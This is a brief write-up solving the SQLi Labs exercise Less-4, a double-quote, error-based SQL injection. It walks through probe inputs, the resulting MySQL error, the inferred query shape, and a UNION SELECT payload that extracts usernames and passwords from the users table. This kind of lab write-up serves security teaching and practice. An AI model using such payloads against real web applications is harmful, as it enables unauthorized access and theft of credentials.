Hello Guys,

This is the write-up for Less-4 'Error Based - Double Quotes - string' from SQLi Labs.

Considering 'Double Quotes' from the topic's name, using double quotes after numeric parameter,
``` [URL]/Less-4/?id=1" -- -```,

an error is returned:

``` 
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right 
syntax to use near '' at line 1
```

Alternately using ``` ?id=1") -- - ```,

``` Your Login name:Dumb
Your Password:Dumb ```

So, the input must be going into the query like ```.... WHERE id = ("<input>") ....;```

So using, ``` [URL]/?id=-1") UNION SELECT 1, group_concat(username,0x7c,password),3 FROM users -- -```
